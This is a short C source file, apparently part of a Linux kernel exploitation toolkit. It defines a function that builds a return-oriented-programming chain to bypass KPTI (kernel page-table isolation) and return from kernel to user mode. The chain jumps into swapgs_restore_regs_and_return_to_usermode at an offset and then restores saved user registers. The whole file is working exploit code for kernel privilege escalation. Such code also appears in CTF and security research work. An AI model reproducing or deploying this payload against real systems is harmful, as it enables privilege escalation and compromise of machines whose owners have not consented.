#include <stdio.h>
#include "../fitz.h"


long long* KPTIROPretUser64(struct trapFrame tf, long long swapgs_restore_regs_and_return_to_usermode, int verbose) {
    if (verbose)
        puts("Generating KPTI bypass return payload...");
    static long long gadget[8] = { 0, };
    gadget[0] = swapgs_restore_regs_and_return_to_usermode + 22;
    gadget[1] = 0x42424242;
    gadget[2] = 0x42424242;
    gadget[3] = tf.user_rip;
    gadget[4] = tf.user_cs;
    gadget[5] = tf.user_rflags;
    gadget[6] = tf.user_rsp;
    gadget[7] = tf.user_ss;

    return gadget;    
}